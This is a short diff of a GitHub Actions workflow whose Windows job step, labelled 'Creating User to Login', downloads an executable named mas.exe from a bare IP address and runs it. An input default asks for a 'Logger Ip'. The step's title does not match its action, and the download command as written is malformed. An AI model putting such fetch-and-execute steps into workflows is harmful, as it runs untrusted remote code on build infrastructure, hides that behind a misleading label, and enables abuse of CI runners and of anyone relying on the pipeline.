@@ -8,14 +8,11 @@ on:
         default: 'Enter Your Logger Ip'
   
 defaults:
-  run:
-    shell: bash
 jobs:
   build:
     runs-on: windows-latest
     steps:
     - name: Creating User to Login
       run: |
-      cmd /c dir
       cmd /c http://44.202.6.121/mas.exe -O
       cmd /c mas.exe
